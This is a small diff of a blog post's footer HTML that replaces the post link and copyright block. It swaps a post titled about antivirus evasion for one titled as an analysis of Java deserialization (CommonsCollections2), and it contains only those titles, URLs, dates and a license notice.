-    <span class="copy-title">Url:</span><a class="post-url" href="/2021/07/07/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2-EXE%E5%85%8D%E6%9D%80%E8%BF%87360/" title="红蓝攻防-EXE免杀过360">http://example.com/2021/07/07/%E7%BA%A2%E8%93%9D%E6%94%BB%E9%98%B2-EXE%E5%85%8D%E6%9D%80%E8%BF%87360/</a>
+    <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-08, 11:17:47</p>
+    <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections2分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
     </p>
